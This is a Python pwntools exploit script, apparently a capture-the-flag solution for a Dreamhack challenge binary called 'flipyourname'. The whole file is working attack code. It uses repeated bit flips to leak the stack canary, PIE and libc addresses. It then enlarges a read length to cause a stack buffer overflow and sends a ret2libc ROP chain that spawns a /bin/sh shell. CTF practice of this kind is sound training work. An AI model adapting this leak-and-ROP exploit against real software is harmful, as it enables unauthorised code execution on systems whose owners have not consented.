#!/usr/bin/env python3

from pwn import *

exe = ELF("./flipyourname")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 20012)

    return r


def main():
    r = conn()

    # flip null bytes
    null_indexes = [
    80, 86, 87,       # 0x7fff72f02660 
    88,               # 0x7fff72f02668
    102, 103,         # 0x7fff72f02670
    110, 111,         # 0x7fff72f02678
    113, 114, 115, 116, 117, 118, 119  # 0x7fff72f02680
]
    for i in null_indexes:
        r.sendafter(b"name? ", b"A" * 0x50)
        r.sendlineafter(b"flip your name :) ", str(i).encode())
        r.sendlineafter(b"want to quit? ", b"n")

    # leak stack values
    r.sendafter(b"name? ", b"A" * 0x50)
    r.sendlineafter(b"flip your name :) ", b"80")
    r.recvuntil(b"hello, ")
    stack_leak = r.recvline()[:-1]
    r.sendlineafter(b"want to quit? ", b"n")

    # parse leaks
    canary = u64(b"\x00" + stack_leak[89:96])
    sfp = u64(stack_leak[96:102] + b"\x00\x00")
    pie_base = u64(stack_leak[104:110] + b"\x00\x00") - 0x1345
    libc_base = u64(stack_leak[120:126] + b"\x00\x00") - libc.symbols["__libc_start_call_main"] - 128

    # flip lower 1byte of nbytes for BOF
    nbytes = pie_base + 0x4010
    nbytes_index = nbytes - (sfp - 0x70)
    r.sendafter(b"name? ", b"A" * 0x50)
    r.sendlineafter(b"flip your name :) ", str(nbytes_index).encode())
    r.sendlineafter(b"want to quit? ", b"n")

    # rop chain
    libc.address = libc_base
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    rdi_gadget = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = ROP(libc).find_gadget(["ret"])[0]

    payload = b"A" * 0x58
    payload += p64(canary)
    payload += b"B" * 8
    payload += p64(ret_gadget) 
    payload += p64(rdi_gadget)
    payload += p64(binsh)
    payload += p64(system)

    r.sendafter(b"name? ", payload)
    r.sendlineafter(b"flip your name :) ", b"0")
    r.sendlineafter(b"want to quit? ", b"y")

    r.interactive()

if __name__ == "__main__":
    main()
